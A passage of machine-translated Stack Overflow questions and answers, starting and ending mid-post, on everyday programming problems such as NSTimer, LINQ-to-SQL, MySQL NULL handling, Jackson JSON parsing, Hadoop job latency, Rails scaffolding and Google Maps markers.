myTimer = [NSTimer scheduledTimerWithTimeInterval:timeinterval target:self selector:@selector(updatplayer:) userInfo:nil repeats:YES];
    [[NSRunLoop mainRunLoop] addTimer:myTimer forMode:NSRunLoopCommonModes]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:10:36.607

这是 NSTimer 的常见问题。虽然您可以使用运行循环模式来改进事情，但更好的解决方案是切换到 GCD 计时器。有关示例，请参见[RNTimer](https://github.com/rnapier/RNTimer)。有关更多信息，请参阅[dispatch_source_create上的文档。](https://developer.apple.com/library/mac/ipad/#documentation/General/Conceptual/ConcurrencyProgrammingGuide/GCDWorkQueues/GCDWorkQueues.html#//apple_ref/doc/uid/TP40008091-CH103-SW1)

# sql - boolean Contains 不支持转换为 SQL

> ID：10862070
> 
> 赞同：1
> 
> 时间：2012-06-02T11:49:25.350
> 
> 标签：sql, linq, linq-to-sql, contains

我得到错误 boolean Contains 不支持转换为 SQL

我有应该删除的房间 ID 数组

我想用这个查询删除，但我不能成功。我该怎么做？

```
var rooms = from rooms in entity.Rooms 
            where myArray.contains(rooms.RoomID) select rooms; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T11:55:56.643

您正在尝试混合通话。Array.Contains 发生在客户端上，但您将它放在发送到 sql server 的表达式的中间。

您需要将全部发送到 sql 进行比较，或者从 sql 返回行并在本地进行比较。

```
rooms = from room in entity.Rooms.AsEnumerable()
        where myArray.contains(room.RoomID)
        select room; 
```

或使用 lambda 语法：

```
rooms = entity.Rooms.AsEnumerable.Where(room => myArray.contains(room.RoomID)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T11:54:02.640

```
 var roomslist =myArray.ToList();
   var roomsTemp = entity.Rooms;
   var rooms=roomsTemp.Where(x=>roomslist.Contains(x.RoomId)).ToList(); 
```

如果这不起作用，那么这应该起作用，但我不建议使用它：

```
 var roomslist =myArray.ToList();
   var roomsTemp = entity.Rooms.ToList();
   var rooms=roomsTemp.Where(x=>roomslist.Contains(x.RoomId)).ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:25:10.727

自从 L2S 以来已经有一段时间了，但这里有。我可以发誓 int[].Contains 是内置的..您是否偶然使用 GUID？也许我在想EF。这有帮助吗：[在 where 子句中使用 Array 进行 Linq 查询？](https://stackoverflow.com/questions/836491/linq-query-with-array-in-where-clause)

如果您要为此编写 SQL 过程，您将传入 ID 的 CSV 字符串。使用相同的想法（警告我的头顶）：

```
var ids = "," + string.Join(",",myArray) + ",";
var rooms = from rooms in entity.Rooms 
        where SqlMethods.Like("," + rooms.RoomID + ",", ids) select rooms; 
```

也许`ids.Contains("," + rooms.RoomID + ",")`会起作用，因为它具有内置 SQL 的翻译（用于字符串）

另一种方法是编写您自己的 UDF，将 CSV 分解为表格并执行`SELECT EXISTS`. 应该有很多这样的例子，因为这是您使用存储过程的方式。然后你可以：

```
var ids = "," + string.Join(",",myArray) + ",";
var rooms = from rooms in entity.Rooms 
        where MyMethods.Contains(ids,rooms.RoomID) select rooms; 
```

# jquery - jQuery body 背景图像旋转器

> ID：10862071
> 
> 赞同：5
> 
> 时间：2012-06-02T11:49:35.070
> 
> 标签：jquery, css, background, slider, image-rotation

对于我目前正在设计的网站，我希望将身体背景放在一组图像的旋转上。我尝试了多种方法，即使用fadeIn() 和fadeOut() 函数，但它们似乎会影响体内分区的不透明度。我也尝试过使用[bgStretcher](http://www.ajaxblender.com/bgstretcher-jquery-stretch-background-plugin.html)但这会导致外观问题并使网站运行缓慢且不稳定。

我希望图像淡入淡出。帮助将不胜感激，

[这是网站的链接](http://danewilson.me/ICT/arlberg/alpha) 我目前一直在修改的脚本文件在/js/目录下叫做background.js。该文件目前已被注释掉，因为它只是实验性的。当前的两个背景图像是“images/bg/bg1.jpg”和“images/bg/bg2.jpg”

这是我正在尝试使用的当前代码：

```
$(document).ready(function() {
    setInterval(switchImage, 5000);
    switchImage();

});

function switchImage()
{
$('body').css("background-image", "url(../images/bg/bg2.jpg)").fadeIn(1000);
$('body').css("background-image", "url(../images/bg/bg1.jpg)").fadeOut(1000);
} 
```

一旦我弄清楚如何在背景图像之间转换，我就可以简单地添加一些条件来在一组图像之间进行更改。

干杯，戴恩·威尔逊

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-02T11:56:04.100

使用这个 jQuery 插件非常简单：[jQuery Backstretch](http://srobbin.com/jquery-plugins/backstretch/) 在演示“在幻灯片中使用 Backstretch”是它的代码片段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:07:39.743

这只能使用 css3 完成。我会尽快发布小提琴。

编辑：我尝试使用关键帧和 CSS3 的背景大小制作动画，但显然他们不想很好地协同工作（闪烁）。那么可能更好地研究jQuery。

# mysql - MySQL - 将 NULL 解释为 0

> ID：10862080
> 
> 赞同：0
> 
> 时间：2012-06-02T11:50:32.607
> 
> 标签：mysql

我有以下 MySQL 查询：

```
$sql = "SELECT `eid` FROM `"._ST_EVENT."` WHERE `tid` = ".$tid." AND DATE(`zeitpunkt`) >= CURDATE() ORDER BY `zeitpunkt` ASC;"; 
```

该变量`$tid`可以为 NULL，但应解释为“0”。是否可以直接在 mysql-query 中执行此操作，还是在执行查询之前我应该​​有这样的 if 子句？

```
if ($tid == NULL) {
    $tid = 0;
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T11:53:09.283

`COALESCE(id, 0)`在 mysql 中是你的朋友 :)

[在这里](http://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#function_coalesce)阅读更多

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T11:56:29.257

使用这个条件：

```
"WHERE `tid` = ".($tid==null?0:$tid)." 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T11:56:18.443

或者：

```
$sql = "SELECT `eid` FROM `"._ST_EVENT."` WHERE `tid` = ".(!$tid ? 0 : $tid)." AND DATE(`zeitpunkt`) >= CURDATE() ORDER BY `zeitpunkt` ASC;"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T11:57:41.170

如果你不喜欢`ANSI SQL`你可以使用 mysql[`IFNULL(id, 0)`](http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#function_ifnull)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-02T11:58:52.670

`ifnull`在您的查询中 使用。

```
$sql = "SELECT `eid` FROM `"._ST_EVENT."` WHERE `tid` = ifnull(".$tid.",0) AND DATE(`zeitpunkt`) >= CURDATE() ORDER BY `zeitpunkt` ASC;"; 
```

# php - 邮件与发送邮件

> ID：10862082
> 
> 赞同：8
> 
> 时间：2012-06-02T11:50:59.383
> 
> 标签：php, email, codeigniter, sendmail

我在 Codeigniter 中使用 Email 类，在[手册](http://codeigniter.com/user_guide/libraries/email.html)中我看到可以使用 3 种协议：mail、sendmail 和 smtp。

mail和sendmail有什么区别？使用邮件协议是否有更高的机会将域标记为垃圾邮件？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T12:19:44.307

如果您使用 *nix，则可能 mail() 和 sendmail() 是相同的。mail() 仍将使用 sendmail，但它会传递您在 php.ini 中定义的任何参数。

更大的区别在于 SMTP 和 sendmail 之间。如果您正在做大量的电子邮件，您想使用 SMTP，因为 sendmail 会为每封电子邮件打开一个新连接，这会增加相当多的开销。

# java - Reading json stream without blocking

> ID：10862088
> 
> 赞同：6
> 
> 时间：2012-06-02T11:52:01.160
> 
> 标签：java, jackson, nonblocking

I want to be able to read stream (from a socket) of json messages using Jackson (2).

There are ways to pass a Reader as the source, such as doing:

```
ObjectMapper mapper = new ObjectMapper();
MyObject obj = mapper.readValue(aReader, MyObject.class); 
```

but that will block until the entire json message has arrived and I want to avoid that.

Is there a way to have a buffer to which I can keep adding bytes with the ability to ask if the buffer contains a full json representation of a specific class?
Something like:

```
JsonBuffer buffer = new JsonBuffer(MyObject.class);
...
buffer.add(readBytes);
if (buffer.hasObject()) {
    MyObject obj = buffer.readObject();
} 
```

Thanks.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2018-06-15T21:30:13.640

[Jackson从 2.9 开始](https://github.com/FasterXML/jackson-core/issues/57)支持非阻塞 JSON 流解析。[您可以在 Spring Framework 5 Jackson2Tokenizer](https://github.com/sdeleuze/spring-framework/blob/master/spring-web/src/main/java/org/springframework/http/codec/json/Jackson2Tokenizer.java)中找到有关如何使用它的示例。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-03T04:06:34.030

您可以使用`JsonParser`来获取单个事件/令牌（这是`ObjectMapper`内部使用的），这允许更精细的访问。但是当前所有功能都使用阻塞 IO，因此没有办法进行所谓的非阻塞（又名“异步”）解析。

编辑：2019-09-18——更正：Jackson 2.9（[https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9)）增加了对非阻塞/异步 JSON 解析的支持（问题[https:// github.com/FasterXML/jackson-core/issues/57](https://github.com/FasterXML/jackson-core/issues/57)）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-08-20T08:28:43.960

（我知道这个线程很旧，但由于没有可接受的答案，我想添加我的，以防万一有人还在读这个）。

我刚刚发布了一个名为 Actson 的新库 ( [https://github.com/michel-kraemer/actson](https://github.com/michel-kraemer/actson) )。它的工作原理几乎与 OP 建议的一样。您可以向它提供字节，直到它返回一个或多个 JSON 事件。当它消耗完所有输入数据后，您向它提供更多字节并获取下一个 JSON 事件。这个过程一直持续到 JSON 文本被完全使用。

如果您了解 Aalto XML ( [https://github.com/FasterXML/aalto-xml](https://github.com/FasterXML/aalto-xml) )，那么您应该能够快速熟悉 Actson，因为界面几乎相同。

这是一个简单的例子：

```
// JSON text to parse
byte[] json = "{\"name\":\"Elvis\"}".getBytes(StandardCharsets.UTF_8);

JsonParser parser = new JsonParser(StandardCharsets.UTF_8);

int pos = 0; // position in the input JSON text
int event; // event returned by the parser
do {
    // feed the parser until it returns a new event
    while ((event = parser.nextEvent()) == JsonEvent.NEED_MORE_INPUT) {
        // provide the parser with more input
        pos += parser.getFeeder().feed(json, pos, json.length - pos);

        // indicate end of input to the parser
        if (pos == json.length) {
            parser.getFeeder().done();
        }
    }

    // handle event
    System.out.println("JSON event: " + event);
    if (event == JsonEvent.ERROR) {
        throw new IllegalStateException("Syntax error in JSON text");
    }
} while (event != JsonEvent.EOF); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-06-03T06:48:29.127

这不是我问题的答案，而是我想出的更多解决方法。

我没有在 Jackson 方面处理非阻塞 IO，而是在我的协议中实现了它。
发送时的所有 json 消息都用 4 个字节的 int 填充，它保存消息其余部分的长度。
现在读取 json 消息变得很容易，我只需找出长度是多少，异步读取它，然后可以将 Jackson 与结果字符串一起使用。

如果有人知道如何直接从杰克逊那里做到这一点，我仍然很想知道。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-05-12T14:44:03.093

如何使用[Gson](https://mvnrepository.com/artifact/com.google.code.gson/gson/2.8.6)？

```
private fun handleActions(webSocketMessage: WebSocketMessage, webSocketSession: WebSocketSession): Mono<WebSocketMessage> {
    val action = Gson().fromJson(webSocketMessage.payloadAsText, ActionWs::class.java)
    return when (action.action) {
        "REGISTER" -> companyService.createCompany(action.company)
            .map { webSocketSession.textMessage(jacksonObjectMapper().writeValueAsString(it)) }
        else -> Mono.just(webSocketSession.textMessage(Gson().toJson(CompanyInfo(0, 0, 0, "ACAO INVALIDA!"))))
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-03-09T19:48:59.473

我为这个问题找到了一些可行的解决方案。您可以使用方法`inputStream.available`检查流中是否有一些字节，并且此方法也是非阻塞的。因此，您可以使用此方法检查是否存在某些内容 - 解析值，如果没有 - 等待一段时间再检查。下面显示了两个示例。

安全风格 - 检查 START_OBJECT json 令牌：

```
while (run.get()) { 
    if (inputStream.available() > 0) {
        for (JsonToken jsonToken; (null != (jsonToken = jsonParser.nextToken())); ) {
            if (JsonToken.START_OBJECT.equals(jsonToken)) {
                outputStream.onNext(jsonParser.readValueAs(tClass));
                break;
            }
        }
    } else {
        Thread.sleep(200); // Or can be another checking time.
    }
} 
```

或者最简单的风格：

```
while (run.get()) {
    if (inputStream.available() > 0) {
        outputStream.onNext(jsonParser.readValueAs(tClass));
    } else {
        Thread.sleep(200); // Or can be another checking time.
    }
} 
```

# performance - Hadoop Map reduce - how to speed up job launch/setup

> ID：10862096
> 
> 赞同：1
> 
> 时间：2012-06-02T11:52:44.803
> 
> 标签：performance, hadoop, mapreduce, jobs, launch-time

I'm using the mongo-hadoop adapter to run map/reduce jobs. everything is fine except the launch time and the time taken by the job. Even when the dataset is very small, the map time is 13 seconds and reduce time is 12 seconds. In fact I have changed settings in mapred-site.xml and core-site.xml. but the time taken for map/reduce seems to be constant. is there any way i can reduce it. I also explored the optimized hadoop distribution from [hanborq](https://github.com/hanborq). they use a worker pool for faster job launch/setup. is there any equivalent available elsewhere as the hanborq distribution is not very active. it was updated 4 months ago and is built on an older version of hadoop.

some of my settings are as follows: mapred-site.xml:

```
<property>
    <name>mapred.child.java.opts</name>
    <value>-Xms1g</value>
</property>
<property>
    <name>mapred.sort.avoidance</name>
    <value>true</value>
</property>
 <property>
      <name>mapred.job.reuse.jvm.num.tasks</name>
          <value>-1</value>
 </property>
<property>
     <name>mapreduce.tasktracker.outofband.heartbeat</name>
     <value>true</value>
</property>
   <property>
       <name>mapred.compress.map.output</name>
       <value>false</value>
   </property> 
```

core-site.xml:

```
<property>
          <name>io.sort.mb</name>
          <value>300</value>
    </property>
<property>
    <name>io.sort.factor</name>
    <value>100</value>
</property> 
```

Any help would be greatly appreciated. thanks in advance.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T07:01:49.787

由于心跳导致部分延迟。任务跟踪器向作业跟踪器发送心跳，让它知道他们还活着，但作为心跳的一部分，他们还宣布他们有多少打开的地图和减少槽。作为响应，JT 将工作分配给 TT 执行。这意味着当您提交作业时，TT 只能以心跳的速度获得任务（每 2 - 4 秒，给予或接受）。此外，JT（默认情况下）在每个心跳期间只分配一个*任务。*这意味着如果您只有一个 TT，即使 TT 有额外的容量，您也只能每 2 - 4 秒分配 1 个任务。

这样你就可以：

1.  缩短两次心跳之间的持续时间。

2.  从 TaskTracker 更改任务调度程序对每个心跳的工作方式。`mapred.fairscheduler.assignmultiple`

# c# - 如何在 ASP.NET MVC 3 中创建简单的范围滑块？

> ID：10862098
> 
> 赞同：3
> 
> 时间：2012-06-02T11:52:48.480
> 
> 标签：c#, .net, asp.net-mvc, asp.net-mvc-3

如何在 ASP.NET MVC 3 中创建简单的范围滑块而不使用诸如`telerik`或任何其他的外部库？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-02T12:08:46.090

**如果你对 jQuery UI 没问题：**

[jQuery UI 滑块](http://jqueryui.com/demos/slider/#rangemin)

示例代码：

```
<meta charset="utf-8">
    <style>
    #demo-frame > div.demo { padding: 10px !important; };
    </style>
    <script>
    $(function() {
        $( "#slider-range-min" ).slider({
            range: "min",
            value: 37,
            min: 1,
            max: 700,
            slide: function( event, ui ) {
                $( "#amount" ).val( "$" + ui.value );
            }
        });
        $( "#amount" ).val( "$" + $( "#slider-range-min" ).slider( "value" ) );
    });
    </script>

<div class="demo">

<p>
    <label for="amount">Maximum price:</label>
    <input type="text" id="amount" style="border:0; color:#f6931f; font-weight:bold;" />
</p>

<div id="slider-range-min"></div>

</div><!-- End demo -->

<div class="demo-description">
<p>Fix the minimum value of the range slider so that the user can only select a maximum.  Set the <code>range</code> option to "min."</p>
</div><!-- End demo-description --> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T12:17:57.403

MVC 使用 javascript 在客户端执行动态操作。使用图像和 javascript 创建滑块将花费大量时间和一些开源库已经完成的广泛研究。

Jquery 和 Jqueryui 就是这样一个开源库，并且每当您在脚本文件夹中创建 MVC 项目时，*Microsoft 也会包含这些库。检查 MVC 项目中的 scripts 文件夹，您会看到类似 jquery-ui-1.8.11.js 的内容（版本可能会有所不同）

带有 jqueryui 的滑块示例：

[http://jqueryui.com/demos/slider/](http://jqueryui.com/demos/slider/)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2016-10-18T11:55:17.623

您可以查看 Shield UI 的[ASP.NET MVC Slider](http://demos.shieldui.com/web/slider/basic-usage)组件，这是在您的 MVC 视图中轻松创建强大滑块的另一种方法。

Razor 代码如下所示：

```
 @(Html.ShieldSlider()
        .Name("slider")
        .Cls("slider")
        .Min(0)
        .Max(10)
        .Value(4)
        .Buttons(true)
        .Ticks(ticks => ticks.Enabled(true))
        .Values(values => values.Template("{0:c}"))
        .Tooltip(tooltip => tooltip.Enabled(true).Template("Price: <b>{0:c}</b>"))) 
```

# iphone - 循环运行线程时iphone textview更新

> ID：10862100
> 
> 赞同：0
> 
> 时间：2012-06-02T11:52:53.073
> 
> 标签：iphone

我正在尝试创建打字机效果。我的代码工作正常。我的问题，还有这个…… UITextView 无法实时更新。这是我的代码：

```
NSMutableArray *testochar=[util getTestoChar:value];

for (int i=0; i<[testochar count]; i++){
    NSString *y=[testochar objectAtIndex:i];

    [NSThread sleepForTimeInterval:0.1f];

    self.txtview.text=[self.txtview.text stringByAppendingString:y];
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T12:00:07.457

您应该在主线程中对 UI 进行的所有修改，尝试使用`performSelectorOnMainThread:withObject:waitUntilDone:`

称呼

```
 //...
    for(int i=0;i<[testochar count];i++){
        NSString *y=[testochar objectAtIndex:i];
        [NSThread sleepForTimeInterval:0.1f];
        NSDictionary *arg =  [NSDictionary dictionaryWithObjectAndKeys:
                self.txtview, @"textView",
                y, @"string", nil ];
       [self performSelectorOnMainThread:@selector(updateTextForTextView:) withObject:arg waitUntilDone:NO];
    }

//.....

-(void)updateTextForTextView:(NSDictionary*)arg {
    NSString *string = [arg objectForKey:@"string"];
    UITextView *textView = [arg objectForKey:@"textView"];
    self.txtview.text=[self.txtview.text stringByAppendingString:string];
} 
```

（更新）

尝试

```
- (void)viewDidLoad {
    [super viewDidLoad];

    textView.text = @"";

    [[NSTimer scheduledTimerWithTimeInterval:0.1 target:self selector:@selector(update) userInfo:nil repeats:YES] retain];
}

-(void) update {
    static char text[] = "HELLO";
    static int i =0;

    if (text[i%6]==0) {
        textView.text = [NSString stringWithFormat:@""];
    } else {
        textView.text = [NSString stringWithFormat:@"%@%c", textView.text, text[i%6] ];
    }
    i++;
} 
```

它的工作方式如下： [http ://www.youtube.com/watch?v=tB2YKX4zpY4](http://www.youtube.com/watch?v=tB2YKX4zpY4)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-03T12:01:50.117

非常感谢您的建议。我通过这种方式修改代码来做到这一点。

1) `self.timer = [[NSTimer scheduledTimerWithTimeInterval:0.1 target:self selector:@selector(update) userInfo:nil repeats:YES] retain];`

```
-(void) update {
    char text[[self.testo length]];

    for(int i=0;i<self.testo.length;i++){
        text[i]=[self.testo characterAtIndex:i];
    }

    static int i =0;

    if (i==self.testo.length) {
      ///  txtview.text = [NSString stringWithFormat:@""];
        [self.timer invalidate];
    } else {
        txtview.text = [NSString stringWithFormat:@"%@%c", txtview.text, text[i%self.testo.length] ];

    } 

    i++;
} 
```

# ruby-on-rails - 在 rails 3.2 的设计用户下生成脚手架

> ID：10862103
> 
> 赞同：1
> 
> 时间：2012-06-02T11:53:23.107
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise, scaffolding

我使用设计，我想在设计用户下生成一个新的对象脚手架，例如：

```
 resources :users, :path => "/", :only => [:show] do
   resources :collections, :controller => 'users/collections'
 end 
```

通过上述路线，我得到了这个网址：

```
http://localhost:3000/kevin_doe/collections 
```

问题是，如果我发出这个命令：

```
rails g scaffold users/collection title:string description:text 
```

这会生成一个命名空间，例如：

```
namespace :users do resources :collections end 
```

我得到的路线是：

```
http://localhost:3000/users/collections 
```

**我想在设计用户资源下生成一个脚手架。**

**我该如何解决这个问题？**

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-05T14:24:38.943

这个问题的修复是接下来的步骤：

1º生成脚手架：

```
rails g scaffold collection title:string description:text 
```

2º 使用嵌套资源修改您的 routes.rb 文件：

```
resources :users, :path => "/", :only => [:show] do
   resources :collections, :controller => 'users/collections'
 end 
```

`"users" folder`3º您必须在您的控制器目录中创建一个并将其移动`collections_controller.rb`到

```
app/controllers/users/ 
```

4º中`collections_controller.rb`你必须修改：

```
class Users::CollectionsController < ApplicationController
.
.
.
end 
```

5º 在您的视图中，您必须将文件夹移动`collections`到`app/views/users/collections`

完毕！:D。

# c# - NRefactory - missing file

> ID：10862105
> 
> 赞同：1
> 
> 时间：2012-06-02T11:53:34.600
> 
> 标签：c#, visual-studio-2010, .net, nrefactory

I am still getting System.IO.FileNotFound Exception when I even try to use NRefactory. I tried many ways to get it working: - Used NuGet package, which istalled Mono.Cecil automatically - downloaded NRefactory and Mono.Cecil, and compiled all DLL's from VS2010.

What am I doing wrong? Here is error dump:

```
 [System.IO.FileNotFoundException]   
    {"Could not load file or assembly 'ICSharpCode.NRefactory, Version=4.2.0.8783,
    Culture=neutral, PublicKeyToken=efe927acf176eea2' or one of its dependencies. 
    The system cannot find the file specified.":"ICSharpCode.NRefactory, 
    Version=4.2.0.8783, Culture=neutral, PublicKeyToken=efe927acf176eea2"}  
    System.IO.FileNotFoundException 
```

EDIT: This is code which causes problems:

```
 List<CodeElement> methodsInvokedByGivenMethod = GetInvokedMethods(methodName, fileName); 
```

And this is a body of method:

```
 private List<CodeElement> GetInvokedMethods(string methodName, string itemWhereMethodIs)
    {
        MessageBox.Show("I am here");
        try
        {
            using (var fs = File.OpenRead(itemWhereMethodIs))
            {
                using (var parser = ParserFactory.CreateParser(SupportedLanguage.CSharp, new StreamReader(fs)))
                {
                    parser.Parse();
                }
            }
        }
        catch (System.IO.FileNotFoundException fnf)
        {
            // This exception arises in Nrefactory...WTF? 0_0
            SetToolStripText("There is exception :(");
            return null;
        }
    } 
```

What is more important, Exception is not being catched by try-catch block within this method, but occurs outside this method -> when it is called, but before any line of code within it.

# javascript - 滚动到jQuery中的顶部按钮

> ID：10862106
> 
> 赞同：2
> 
> 时间：2012-06-02T11:53:35.513
> 
> 标签：javascript, jquery, animation, scroll

我的页面上有 div.triangle，透明度为 0
，一旦页面底部被击中，我希望它淡入不透明度 .95，
然后，我希望它滚动到 $(".container") 的顶部一次 $ （“.triangle”）再次点击
我到目前为止，我想我已经得到了大部分的权利，除了事件？

> ```
>  <script type="text/javascript">
>       $(document).ready(function(){
>           $(".container").scroll(function(){
>               var currentPosition = $(document).scrollTop(); 
>               var totalHeight = $(document).offsetHeight;
>               var visibleHeight = $(document).clientHeight;
>                   if (visibleHeight + currentPosition >= totalHeight){
>                       $(".triangle").fadeTo("slow",.95);
>                   }
>           });
>           $(".triangle").click(function(){
>               $(".container").animate({scrollTop:0}, 'slow');
>               $(".triangle").fadeTo("slow",0);
>           });
>       });
>    </script> 
> ```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:10:32.833

试试这个：

```
 $(document).ready(function(){
      var bottom = ($(window).outerHeight() - $(window).height()) - 50; // 50 pixel to the bottom of the page; 
      $(window).scroll(function(){
          if ($(window).scrollTop() >= bottom ) {
                  $(".triangle").fadeTo("slow",.95);
             } else {
                  $(".triangle").fadeOut("slow");
             }
      });

      $(".triangle").click(function(){
          $('html, body').animate({scrollTop:0}, 'slow');
          $(".triangle").fadeOut("slow");
      });
  }); 
```

# php - Does MongoDB Limit() load all the documents in memory?

> ID：10862109
> 
> 赞同：3
> 
> 时间：2012-06-02T11:53:57.210
> 
> 标签：php, mongodb

```
$result = $collection->find('some constraints')->limit(10); 
```

Now suppose the documents satisfying "some constraints" are 10000\.

So, does this query first fetch 10000 documents in memory and returns 10 to me or does it load only 10 documents specified by `limit`?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-02T16:26:20.040

我最近写了[一篇](http://derickrethans.nl/cursors-in-mongodb.html)关于这个的文章。简而言之，当您使用limit时，驱动程序将仅向服务器请求10个项目，因此在客户端，内存中不会超过10个文档。“限制”严格来说是*客户端*的事情，仅在获取文档时使用。查询仍将完整运行。

在服务器端，所有符合 find() 约束的文档都将被读取，这意味着操作系统会将它们从磁盘放入内存中，如果它们还没有在内存中的话。但话又说回来，从 MongoDB 服务器进程来看，所有文档总是在内存中；由操作系统来进行缓存，并在磁盘之间进行分页。[在他们的文档](http://www.mongodb.org/display/DOCS/Caching)中阅读更多关于 MongoDB 如何管理内存的信息。

# google-maps - Disappearing custom markers - google maps v3

> ID：10862110
> 
> 赞同：2
> 
> 时间：2012-06-02T11:53:59.067
> 
> 标签：google-maps, google-maps-api-3

I am trying to create a map with custom markers.

When heights and widths are all the same, everything works fine. If I change one of them to be bigger (2x), that marker starts to behave funny - it's partially rendered on map, it disappears and reappears when zooming in/out, on some zoom levels it looks ok. Input images are all 128x128, I am scaling them to 32x32 but i would like some of them to be 64x32

Here's main function for adding markers (I commented out things that I tried before):

```
jQuery(xml).find("marker").each(function(){
var name = jQuery(this).find('name').text();
var address = jQuery(this).find('address').text();

// create a new LatLng point for the marker
var lat = jQuery(this).find('lat').text();
var lng = jQuery(this).find('lng').text();
var twidth = jQuery(this).find('width').text();
var theight = jQuery(this).find('height').text();
var point = new google.maps.LatLng(parseFloat(lat),parseFloat(lng));
var imgPath = jQuery(this).find('icon').text();

var hw = twidth/2;
var hh = theight/2;
var imageForMarker = new google.maps.MarkerImage(
    imgPath,
    null,     //new google.maps.Size(128, 128),
    // The origin for this image is 0,0.
    null,     //new google.maps.Point(0,0),
    // The anchor for this image is at the centre
    null,    //new google.maps.Point(hw, hh),
    // Scaled size
    new google.maps.Size(twidth, theight));

    // extend the bounds to include the new point
    MYMAP.bounds.extend(point);

    var marker = new google.maps.Marker({
            position: point,
            map: MYMAP.map,
            icon: imageForMarker,
            zIndex:0
        });

        citiesArray.push(marker);

        var html='<strong>'+name+'</strong.><br />'+address+'<br><img src="http://chart.apis.google.com/chart?cht=qr&chs=200x200&chl=http%3A//maps.google.com/maps%3Fq=%26ll%3D'+lat+'%2C'+lng+'%26z%3D14&chld=H|0">';

        google.maps.event.addListener(marker, 'click', function() {

        if(infoWindow)
            infoWindow.close();
        infoWindow = new google.maps.InfoWindow();

            infoWindow.setContent(html);

            infoWindow.open(MYMAP.map, marker);

        });

        MYMAP.map.fitBounds(MYMAP.bounds);

    }); 
```

xml is this:

```
<?xml version="1.0"?>
<markers>

<marker>
<name>name1</name>
<address></address>
<lat>54.721844</lat>
<lng>17.41024</lng>
<width>32</width>
<height>32</height>
<icon>park2.png</icon>
</marker>

( ...)

<marker>
<name>name2</name>
<address></address>
<lat>50.417408112618686</lat>
<lng>23.491015625</lng>
<width>32</width>
<height>32</height>
<icon>park.png</icon>
</marker>

</markers> 
```

here's MYEDIT definition + initialization:

var infoWindow; var MYMAP = { map: null, bounds: null, iWindow: null }

```
MYMAP.init = function(selector, latLng, zoom) {
var myOptions = {
zoom:zoom,
center: latLng,
mapTypeId: google.maps.MapTypeId.ROADMAP
}
this.map = new google.maps.Map(jQuery(selector)[0], myOptions);
this.bounds = new google.maps.LatLngBounds();
} 
```

test bed is at:

[http://null-zero.com/test/markers/markers.html](http://null-zero.com/test/markers/markers.html)

IMPORTANT: you have to scroll down, tick CITIES, then at the top of the map near GDANSK a castle should appear - it's broken (top part of the castle is visible), strange things happen when you zoom in/out.

There are two PlaceMarkers functions - the bottom one uses different width/height and is broken (placeMarkersCities)

Any ideas what causes it and how to fix it?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-10T13:08:05.103

您当前的代码是

```
var twidth = jQuery(this).find('width').text();
var theight = jQuery(this).find('height').text();
...
new google.maps.Size(twidth, theight)); 
```

但`Size`需要两个**Numbers**。当地图对象输入错误的参数类型时，会发生奇怪的事情。在这种情况下，您只需将部分数据从字符串转换为数字。你不转换`twidth`和`theight`.

我建议在阅读时转换数据

```
var lat = parseFloat(jQuery(this).find('lat').text());
var lng = parseFloat(jQuery(this).find('lng').text());
var twidth = parseInt(jQuery(this).find('width').text());
var theight = praseInt(jQuery(this).find('height').text()); 
```

而不是在您使用它时（如在您当前的代码中）

```
var point = new google.maps.LatLng(parseFloat(lat),parseFloat(lng)); 
```

因为那时它已经完成了一次，你不必记住它。

# html - webkit - center link text

> ID：10862113
> 
> 赞同：0
> 
> 时间：2012-06-02T11:54:16.537
> 
> 标签：html, css, webkit

I am trying to center the text of an href element, on webkit browsers (chrome/safari).

This is the html:

```
<div>
        <a onclick="check(1);" id="check1" class="linkText">center please</a>
</div> 
```

The css is:

```
.linkText, .linkText:hover
 {
margin: 0 auto;
background-image:url(/images/q.png);
width:280px;
height:57px;
background-repeat:no-repeat;
background-color:Transparent;
border:none;
font-size:18px;
font-weight:normal !important;
color:Black !important;
text-shadow: none !important;
display: -webkit-box;
text-align:center;
-webkit-box-align: center;
box-align: center;
    } 
```

The result I get is shown in the image attaced: ![enter image description here](../Images/3272370c0f24c759020b74d699a8e7d9.png)

Any ideas? 10X!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-02T13:02:23.300

将此添加到您的CSS！

```
-webkit-box-pack:center; 
```

它将解决问题。

在这里查看[http://jsfiddle.net/yscPm/](http://jsfiddle.net/yscPm/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:14:44.080

为什么不将文本对齐添加到 div？

别的用这个

```
<div><center>
